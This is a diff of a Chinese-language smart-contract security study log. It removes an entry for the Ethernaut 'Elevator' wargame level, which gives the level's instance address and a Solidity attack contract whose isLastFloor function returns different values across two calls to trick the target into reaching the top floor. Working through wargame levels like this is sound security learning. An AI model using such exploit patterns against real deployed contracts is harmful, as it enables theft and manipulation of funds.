@@ -139,25 +139,5 @@ contract AttackReentracy {
     }
 }
 ```
-### 2024.09.03
-#### Ethernaut - Elevator
-合约地址：0x5cE212358a2D77fcd4cE431a33E5eDe2C3453C4d
-题目要求构造一个合约，并且在一次交易的两次调用中，返回不同的值
-```
-contract BuildingImpl is Building {
-    uint public top = 0;
-    
-    function isLastFloor(uint256) external returns (bool) {
-        top++;
-        return top == 2;
-    }
-
-    // 0x5cE212358a2D77fcd4cE431a33E5eDe2C3453C4d
-    function attack(address elevator) external   {
-        Elevator elevatorContract = Elevator(elevator);
-        elevatorContract.goTo(1);
-    }
-}
-```
 
 <!-- Content_END -->
